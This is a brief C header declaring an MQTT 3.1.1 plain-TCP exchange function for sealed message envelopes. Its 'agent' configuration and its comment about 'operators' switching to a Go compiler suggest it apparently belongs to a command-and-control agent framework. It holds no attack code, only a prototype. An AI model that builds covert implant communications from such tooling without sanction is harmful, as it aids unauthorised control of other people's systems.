#ifndef ERLIKHAN_MQTT_H
#define ERLIKHAN_MQTT_H

#include "common.h"

/* Raw-envelope exchange over MQTT 3.1.1 plain TCP (no TLS in native;
 * use_ssl=True fails so operators switch to the go compiler). */
int mqtt_exchange(const agent_config_t *cfg, const unsigned char *sealed, size_t sealed_len,
                  unsigned char **out, size_t *out_len);

#endif
